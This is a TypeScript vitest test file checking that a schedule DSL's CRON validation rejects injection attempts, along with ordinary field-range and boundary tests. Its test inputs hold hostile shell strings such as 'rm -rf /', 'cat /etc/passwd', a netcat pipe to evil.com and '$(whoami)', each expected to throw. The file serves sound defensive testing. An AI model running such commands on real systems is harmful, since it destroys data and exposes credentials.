/**
 * CRON Injection Vulnerability Tests (do-stfi)
 *
 * Tests for CRON expression injection prevention in the schedule DSL.
 *
 * The vulnerability: User input through parseTimeString and cron field
 * construction could allow malicious CRON expressions to be created.
 *
 * These tests validate that:
 * 1. Malicious time inputs are rejected
 * 2. CRON field values are properly validated
 * 3. Boundary conditions are handled correctly
 *
 * @module do/tests/cron-injection.test
 */

import { describe, it, expect, beforeEach } from 'vitest'
import {
  createEveryProxy,
  type ScheduleRegistration,
} from '../workflow/schedule'
import {
  validateCronExpression,
  validateCronField,
} from '../workflow/cron-validation'

// ============================================================================
// CRON INJECTION TESTS - Malicious Input Rejection
// ============================================================================

describe('CRON Injection Prevention', () => {
  let schedules: Map<string, ScheduleRegistration>
  let every: ReturnType<typeof createEveryProxy>

  beforeEach(() => {
    schedules = new Map()
    every = createEveryProxy(schedules)
  })

  describe('Malicious time string input', () => {
    it('should reject time strings with shell injection attempts', () => {
      // Attempt shell command injection via time string
      expect(() => every.day.at('9am; rm -rf /')(async () => {})).toThrow()
      expect(() => every.day.at('9am && cat /etc/passwd')(async () => {})).toThrow()
      expect(() => every.day.at('9am | nc evil.com 1234')(async () => {})).toThrow()
    })

    it('should reject time strings with CRON field escape attempts', () => {
      // Attempt to inject additional CRON fields
      expect(() => every.day.at('9 * * * *')(async () => {})).toThrow()
      expect(() => every.day.at('0 9 * * * /bin/sh')(async () => {})).toThrow()
    })

    it('should reject time strings with special characters', () => {
      // These could potentially confuse the CRON parser
      expect(() => every.day.at('9am`whoami`')(async () => {})).toThrow()
      expect(() => every.day.at('$HOME/9am')(async () => {})).toThrow()
      expect(() => every.day.at('9am\x00hidden')(async () => {})).toThrow()
      expect(() => every.day.at('9am\nmalicious')(async () => {})).toThrow()
    })

    it('should reject time strings with unicode injection', () => {
      // Unicode normalization attacks
      expect(() => every.day.at('9\u202Eam')(async () => {})).toThrow() // Right-to-left override
      expect(() => every.day.at('9\u200Bam')(async () => {})).toThrow() // Zero-width space
    })
  })

  describe('CRON field validation', () => {
    it('should reject minute values outside 0-59', () => {
      expect(() => validateCronField('minute', '60')).toThrow()
      expect(() => validateCronField('minute', '-1')).toThrow()
      expect(() => validateCronField('minute', '100')).toThrow()
    })

    it('should reject hour values outside 0-23', () => {
      expect(() => validateCronField('hour', '24')).toThrow()
      expect(() => validateCronField('hour', '-1')).toThrow()
      expect(() => validateCronField('hour', '25')).toThrow()
    })

    it('should reject day-of-month values outside 1-31', () => {
      expect(() => validateCronField('dayOfMonth', '0')).toThrow()
      expect(() => validateCronField('dayOfMonth', '32')).toThrow()
      expect(() => validateCronField('dayOfMonth', '-5')).toThrow()
    })

    it('should reject month values outside 1-12', () => {
      expect(() => validateCronField('month', '0')).toThrow()
      expect(() => validateCronField('month', '13')).toThrow()
      expect(() => validateCronField('month', '-1')).toThrow()
    })

    it('should reject day-of-week values outside 0-7', () => {
      expect(() => validateCronField('dayOfWeek', '8')).toThrow()
      expect(() => validateCronField('dayOfWeek', '-1')).toThrow()
    })

    it('should reject invalid range formats', () => {
      expect(() => validateCronField('minute', '5-3')).toThrow() // End before start
      expect(() => validateCronField('minute', '5--3')).toThrow() // Malformed
      expect(() => validateCronField('minute', '-5-10')).toThrow() // Negative start
      expect(() => validateCronField('hour', '0-24')).toThrow() // Out of bounds
    })

    it('should reject invalid step formats', () => {
      expect(() => validateCronField('minute', '*/0')).toThrow() // Zero step
      expect(() => validateCronField('minute', '*/61')).toThrow() // Step larger than range
      expect(() => validateCronField('minute', '*/-5')).toThrow() // Negative step
    })

    it('should reject invalid list formats', () => {
      expect(() => validateCronField('minute', '0,60,30')).toThrow() // Out of range in list
      expect(() => validateCronField('hour', '0,,5')).toThrow() // Empty list item
      expect(() => validateCronField('minute', ',5,10')).toThrow() // Leading comma
      expect(() => validateCronField('minute', '5,10,')).toThrow() // Trailing comma
    })

    it('should reject non-numeric values in numeric fields', () => {
      expect(() => validateCronField('minute', 'abc')).toThrow()
      expect(() => validateCronField('hour', 'noon')).toThrow()
      expect(() => validateCronField('minute', '1a2')).toThrow()
    })

    it('should accept valid field values', () => {
      // These should NOT throw
      expect(() => validateCronField('minute', '0')).not.toThrow()
      expect(() => validateCronField('minute', '59')).not.toThrow()
      expect(() => validateCronField('minute', '*')).not.toThrow()
      expect(() => validateCronField('minute', '0-30')).not.toThrow()
      expect(() => validateCronField('minute', '*/5')).not.toThrow()
      expect(() => validateCronField('minute', '0,15,30,45')).not.toThrow()
      expect(() => validateCronField('hour', '0-23')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '1-5')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '0')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '7')).not.toThrow() // Sunday alias
    })
  })

  describe('Full CRON expression validation', () => {
    it('should reject expressions with wrong number of fields', () => {
      expect(() => validateCronExpression('0 9 * *')).toThrow() // 4 fields
      expect(() => validateCronExpression('0 9 * * * *')).toThrow() // 6 fields (unless seconds supported)
      expect(() => validateCronExpression('0')).toThrow() // 1 field
    })

    it('should reject expressions with invalid field values', () => {
      expect(() => validateCronExpression('60 9 * * *')).toThrow() // Invalid minute
      expect(() => validateCronExpression('0 25 * * *')).toThrow() // Invalid hour
      expect(() => validateCronExpression('0 9 32 * *')).toThrow() // Invalid day
      expect(() => validateCronExpression('0 9 * 13 *')).toThrow() // Invalid month
      expect(() => validateCronExpression('0 9 * * 8')).toThrow() // Invalid weekday
    })

    it('should reject expressions with injection attempts', () => {
      expect(() => validateCronExpression('0 9 * * * ; rm -rf /')).toThrow()
      expect(() => validateCronExpression('0 9 * * * && cat /etc/passwd')).toThrow()
      expect(() => validateCronExpression('$(whoami) 9 * * *')).toThrow()
    })

    it('should accept valid CRON expressions', () => {
      // These should NOT throw
      expect(() => validateCronExpression('0 9 * * 1')).not.toThrow() // Monday 9am
      expect(() => validateCronExpression('0 0 * * *')).not.toThrow() // Midnight daily
      expect(() => validateCronExpression('*/15 * * * *')).not.toThrow() // Every 15 min
      expect(() => validateCronExpression('0 0 1 * *')).not.toThrow() // First of month
      expect(() => validateCronExpression('0 8 * * 1-5')).not.toThrow() // Weekdays 8am
      expect(() => validateCronExpression('0,30 9-17 * * *')).not.toThrow() // Complex
    })
  })

  describe('Boundary condition handling', () => {
    it('should handle empty time strings', () => {
      expect(() => every.day.at('')(async () => {})).toThrow()
    })

    it('should handle whitespace-only time strings', () => {
      expect(() => every.day.at('   ')(async () => {})).toThrow()
      expect(() => every.day.at('\t')(async () => {})).toThrow()
      expect(() => every.day.at('\n')(async () => {})).toThrow()
    })

    it('should handle extremely long time strings', () => {
      const longString = '9am' + 'a'.repeat(10000)
      expect(() => every.day.at(longString)(async () => {})).toThrow()
    })

    it('should handle time boundary values correctly', () => {
      // Edge cases that should work
      expect(() => every.day.at('12:00am')(async () => {})).not.toThrow() // Midnight
      expect(() => every.day.at('11:59pm')(async () => {})).not.toThrow() // 23:59
      expect(() => every.day.at('12:00pm')(async () => {})).not.toThrow() // Noon
      expect(() => every.day.at('00:00')(async () => {})).not.toThrow() // 24h format midnight

      // Edge cases that should fail
      expect(() => every.day.at('13:00am')(async () => {})).toThrow() // Invalid
      expect(() => every.day.at('00:60')(async () => {})).toThrow() // Invalid minute
      expect(() => every.day.at('24:00')(async () => {})).toThrow() // Hour overflow
    })
  })

  describe('Integration: Schedule registration with validation', () => {
    it('should only register schedules with valid time inputs', () => {
      // Valid registrations
      every.Monday.at9am(async () => {})
      expect(schedules.size).toBe(1)

      every.day.at('6pm')(async () => {})
      expect(schedules.size).toBe(2)

      // Invalid should not register (and should throw)
      expect(() => every.day.at('invalid; rm -rf /')(async () => {})).toThrow()
      expect(schedules.size).toBe(2) // No new registration
    })

    it('should produce valid CRON expressions for all registered schedules', () => {
      // Register various schedules
      every.Monday.at9am(async () => {})
      every.Friday.at5pm(async () => {})
      every.day.at('3:30pm')(async () => {})
      every(30).minutes(async () => {})

      // All registered schedules should have valid CRON expressions
      for (const schedule of schedules.values()) {
        if (schedule.interval.expression) {
          expect(() => validateCronExpression(schedule.interval.expression!)).not.toThrow()
        }
      }
    })
  })
})
